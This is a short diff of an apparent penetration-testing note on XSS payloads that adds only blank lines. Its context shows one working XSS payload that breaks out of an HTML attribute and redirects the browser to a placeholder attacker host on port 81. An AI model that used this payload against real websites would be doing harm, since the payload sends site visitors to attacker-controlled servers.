@@ -9,6 +9,8 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 # xss payloads
 
+
+
 **Command** ([[xss enumeration payloads]]):
 
 ```bash
@@ -18,6 +20,12 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 
 ```
 
+
+
+
+
+
+
 **Command** ([[xss redirect to own webserver]]):
 
 ```bash
@@ -25,3 +33,9 @@ updated_at: '2023-05-29T16:48:52.690130+00:00'
 '">><script>window.location="http://attacker-ip:81";</script>
 
 ```
+
+
+
+
+
+
